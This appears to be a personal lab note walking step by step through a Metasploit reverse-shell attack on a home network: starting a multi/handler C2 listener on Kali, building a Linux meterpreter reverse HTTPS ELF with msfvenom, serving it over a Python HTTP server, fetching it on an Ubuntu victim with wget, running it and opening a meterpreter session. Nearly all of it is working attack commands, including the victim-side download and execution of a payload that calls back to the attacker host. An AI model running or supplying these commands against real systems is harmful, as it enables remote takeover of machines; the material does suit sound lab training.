## Step 1 — Start the C2 listener on Kali

On **Kali (192.168.11.4)**:

```bash
msfconsole -q
```

Inside Metasploit:

```
use exploit/multi/handler
set payload linux/x64/meterpreter_reverse_https
set LHOST 192.168.11.4
set LPORT 8443
set ExitOnSession false
exploit -j
```

This spins up a background HTTPS listener on **8443** ready to accept connections from the victim.

> Tip: If 8443 is busy, pick another high port (e.g., 9443) and change LPORT accordingly.
> 

---

## Step 2 — Build the Linux payload (ELF) on Kali

Still on **Kali** (new terminal is fine):

```bash
msfvenom -p linux/x64/meterpreter_reverse_https LHOST=192.168.11.4 LPORT=8443 -f elf -o /tmp/rs_https.elf
chmod +x /tmp/rs_https.elf
sha256sum /tmp/rs_https.elf
```

Keep the hash for your notes.

---

## Step 3 — Transfer the payload to the victim

Pick **one** method.

**A) Via SCP (recommended, if SSH is enabled on Ubuntu)**

```bash
scp /tmp/rs_https.elf user@192.168.10.4:/tmp/
```

**B) Simple HTTP server (no SSH required)**

On Kali:

```bash
cd /tmp && python3 -m http.server 8000
```

On Ubuntu:

```bash
wget http://192.168.11.4:8000/rs_https.elf -O /tmp/rs_https.elf
chmod +x /tmp/rs_https.elf
```

---

## Step 4 — Execute the payload on the victim

On **Ubuntu (192.168.10.4)**:

```bash
chmod +x /tmp/rs_https.elf
/tmp/rs_https.elf &
```

Within a few seconds, go back to **Metasploit** on Kali:

```bash
sessions
```

You should see a `meterpreter` session. Interact with it:

```bash
sessions -i 1
sysinfo
ifconfig
getuid
```

---

## Additional Notes:

If using a virtual machine, enable [[Port Forwarding]]
When creating the msf venom payload, make sure to use the Local machine IP and when calling the msf exploit handler, set the ip to the one mentioned in your port forwarding rule. In my case, it is 0.0.0.0
Use port 4444 as it is set in the port forwarding rule through which the target machine will be able to reach kali.

![[Pasted image 20250903142747.png]]

![[Pasted image 20250903142813.png]]
